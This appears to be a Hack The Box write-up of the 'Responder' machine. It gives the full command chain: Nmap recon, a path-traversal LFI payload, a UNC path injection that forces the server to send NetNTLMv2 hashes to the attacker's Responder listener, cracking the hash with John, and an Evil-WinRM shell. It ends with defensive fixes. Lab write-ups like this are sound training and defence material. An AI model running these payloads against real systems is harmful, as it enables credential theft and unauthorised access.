---
title: "HTB Responder: A Rōnin's Guide to LFI and NetNTLMv2"
description: "Pwned Responder on Hack The Box using LFI to grab NetNTLMv2 hashes. Then Evil-WinRM for the easy W."
date: 2026-07-21T21:27:08+01:00
tags: ["htb", "windows", "ntlm", "lfi", "red-team"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-04.png
draft: false
---

> "Perceive that which cannot be seen with the eye." — Miyamoto Musashi, *Vagabond*

## 1. Quick Info Card
	
| Field | Value |
|---|---|
| **Machine Name** | Responder |
| **OS / Type** | Windows |
| **Difficulty** | Very Easy |
| **Key Vulnerability** | LFI → UNC Injection → NTLM Hash Capture → Password Cracking → WinRM |

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright chat, let's set the scene. We fire up the HTB VPN, slap the target IP into our `/etc/hosts` because we aren't absolute savages, and let Nmap do its thing. 

**The Plan (in our heads):**
> "Okay, Nmap's running. Probably some crusty web server, maybe SSH, let's see what we're working with."

**What we actually got:**
```text
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  http    (Microsoft HTTPAPI)  ← wait, WinRM? Interesting...
```

**The Immediate Thoughts:**
- **Port 80** → Web server. Cool, let's poke it.
- **Port 5985** → WinRM. That's literally a backdoor if we secure some creds. We love a good WinRM shell.

**Facepalm Moment #1:** We browse to `http://10.129.112.205` and get redirected to `http://unika.htb/`. Except our browser has NO IDEA what `unika.htb` is because DNS doesn't know about HTB domains. So we're sitting there like:
> "Why isn't it loading? Did I break the VPN? Is my Kali cursed?"

**The Fix:** Add `10.129.112.205 unika.htb` to `/etc/hosts` and pray to the infosec gods.

**Facepalm Moment #2:** We start directory busting. Nothing. We check for `robots.txt`. Nada. We check for `phpinfo.php`. Zip. We're about to scream.

**The Aha Moment:** We notice the language switcher on the page. Clicking a flag changes the URL to `?page=...`. We try `?page=../../../../../../windows/win.ini` and BOOM — we get the Windows `win.ini` file. LFI confirmed. Get in there!

**Facepalm Moment #3:** We try to read `C:\Users\Administrator\Desktop\flag.txt` directly via LFI, but it's not there. Wait... we're not even on the right desktop. There's a `mike` user. The flag is on mike's desktop? Super sus.

But now we have LFI, and Windows is on the other side. And you know what that means? **UNC Path Injection + Responder = Free Hashes**. This is where the fun begins. Time to draw the sword.

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Nmap Scan:**
```bash
nmap -T4 -n -Pn --top-ports 1000 -sC -sV 10.129.112.205
```

**Results:**
```text
80/tcp   open  http    Apache httpd 2.4.52 (Win64) PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**What we learned:**
- Windows box (Apache on Windows is a dead giveaway)
- PHP 8.1.1
- WinRM (port 5985) is wide open

### Web Enumeration

We add the domain to `/etc/hosts`:
```bash
echo "10.129.112.205 unika.htb" | sudo tee -a /etc/hosts
```

Then we visit `http://unika.htb/`. It's a simple website with language flags. Clicking a flag changes the URL to:
```text
http://unika.htb/?page=french.html
```

**Parameter Found:** `page`

**LFI Test:**
```text
http://unika.htb/?page=../../../../../../windows/win.ini
```

It works. We have Local File Inclusion.

### NTLM Hash Capture (The Responder Tango)

Here's the sauce: On Windows, if you tell the system to open a file path starting with `\\` (a UNC path), Windows will automatically attempt to authenticate to that SMB server, sending the user's NTLM hash over the network.

So we do this:

**1. Start Responder on our attacker machine:**
```bash
sudo responder -I tun0 -v
```
This starts a fake SMB server that captures any authentication attempts.

**2. Trigger the LFI with our IP:**
```text
http://unika.htb/?page=//10.10.14.6/somefile
```
*(Replace `10.10.14.6` with your HTB VPN IP.)*

**3. Watch the hash roll in:**
```text
[SMB] NTLMv2-SSP Client   : 10.129.112.205
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:76f6b85384ebeb0d:D64FCAFA69A6677D177640B016A0BB7C:010100...
```

We got the Administrator's hash. Easy money.

### Cracking the Hash

The hash we captured is NetNTLMv2, not the NTLM hash. You cannot use this directly for Pass-the-Hash. You need to crack it to get the plaintext password.

We save the hash to a file:
```bash
echo 'Administrator::RESPONDER:76f6b85384ebeb0d:D64FCAFA69A6677D177640B016A0BB7C:010100...' > hash.txt
```

Then we crack it with John the Ripper:
```bash
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**
```text
badminton        (Administrator)
```

Password: `badminton`. Of course it's `badminton`. Classic HTB.

### Shell Time (WinRM)

Now we have the Administrator password and port 5985 (WinRM) is open. We use Evil-WinRM to get a shell:
```bash
evil-winrm -i 10.129.112.205 -u Administrator -p badminton
```

We're in.

### Grabbing the Flag

We land as Administrator. But the flag is on mike's desktop for some reason. We navigate:
```powershell
dir C:\Users\mike\Desktop
```

**Output:**
```text
-a----         3/10/2022   4:50 AM             32 flag.txt
```

Read it:
```powershell
type C:\Users\mike\Desktop\flag.txt
```

**Flag:** `HTB{...}`

## 4. How to Patch This (The Blue Team Defense)

So you're a sysadmin and you just watched a digital rōnin walk right into your Windows server using a password from `rockyou.txt`. Peak tragedy. Here's how to stop this from happening and save your dignity:

1. **Fix the LFI Vulnerability**
   - **Root Cause:** The web app accepts user-controlled filenames in the `page` parameter without sanitization. Like, bruh.
   - **Fix:** Use a whitelist approach. Only allow specific filenames (e.g., `french.html`, `english.html`). Never trust user input for file paths.
   - **Better:** Don't include files dynamically at all. Use a proper templating system so you don't leak the keys to the castle.

2. **Enforce Strong Passwords**
   - **Root Cause:** `badminton` is in `rockyou.txt`. Come on now.
   - **Fix:** Implement a real password policy. Minimum length 12, require special characters, numbers, and upper/lowercase. Use an Active Directory password policy.
   - **Bonus:** Use Microsoft's Azure AD Password Protection to ban common passwords.

3. **Secure WinRM**
   - **Root Cause:** WinRM is accessible over HTTP (port 5985) from any IP in the wild.
   - **Fix:** Use WinRM over HTTPS (port 5986) with a valid certificate. Restrict WinRM access using Windows Firewall to only allow management subnets. Use CredSSP or Kerberos authentication where possible, not Basic Auth.

4. **Disable NTLM Authentication (if possible)**
   - **Root Cause:** Windows gladly sends NTLM hashes over the network when accessing UNC paths.
   - **Fix:** In a pure Active Directory environment, you can disable NTLM and force Kerberos. It's more secure and doesn't leak hashes every time someone types `\\`.

5. **Network Segmentation**
   - **Root Cause:** The web server could reach out to an attacker's SMB share.
   - **Fix:** Block outbound SMB (port 445) from web servers. They don't need it. Also, block SMB inbound from untrusted networks. Zero trust, friends.

## Final Thoughts

This machine is a perfect example of why low-hanging fruit is still out there ending careers. A simple LFI + weak password + WinRM = absolute, uncompromising pwnage. It's a reminder that security is a chain, and the chain is only as strong as its weakest link (which in this case, was someone naming their admin password after a backyard sport).

And as Musashi said:

> "The way of the warrior is resolute acceptance of death."

Well, maybe not death, but at least accepting that `badminton` is not a password. Stay sharp, trust nothing, and keep hacking.

GG. See you on the next box.

*Write-up by 0xAkr4m | HTB Player #141897*
